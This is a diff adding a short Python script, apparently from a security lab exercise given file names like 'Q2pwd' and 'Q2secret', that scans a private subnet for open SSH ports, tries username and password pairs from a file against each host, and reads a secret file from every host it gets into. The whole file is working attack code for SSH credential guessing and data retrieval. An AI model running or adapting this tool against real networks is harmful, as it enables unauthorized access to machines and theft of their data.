@@ -1,0 +1,53 @@
+import socket
+import paramiko
+from time import time, sleep
+
+def scan_ssh_in_subnet(network_base):
+    active_ips = []
+    socket.setdefaulttimeout(1)
+
+    for idx in range(256):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        target_host = f"{network_base}{idx}"
+
+        is_open = s.connect_ex((target_host, 22))
+        if is_open == 0:
+            print(f"SSH detected on: {target_host}")
+            active_ips.append(target_host)
+        s.close()
+
+    return active_ips
+
+def extract_credentials_from_file(filepath):
+    with open(filepath, 'r') as f:
+        return [line.strip().split() for line in f]
+
+def connect_and_retrieve_secrets(host_list, credentials, output_file):
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    with open(output_file, "w") as secret_output:
+        for host in host_list:
+            for uname, passwd in credentials:
+                try:        
+                    ssh_client.connect(host, port=22, username=uname, password=passwd)
+                    print(f"Connected to {host} with user: {uname}, pass: {passwd}")
+
+                    stdin, stdout, stderr = ssh_client.exec_command("cat Q2secret")
+                    secret_output.write(stdout.read().decode())
+
+                    ssh_client.close()
+                except:
+                    sleep(0.1)
+                    continue
+
+if __name__ == '__main__':
+    begin_time = time()
+    
+    subnet_prefix = '172.16.48.'
+    active_hosts = scan_ssh_in_subnet(subnet_prefix)
+    user_pass_pairs = extract_credentials_from_file('../Q2pwd')
+
+    connect_and_retrieve_secrets(active_hosts, user_pass_pairs, "Q2secrets.txt")
+    
+    print(f"Completed in: {time() - begin_time} seconds")
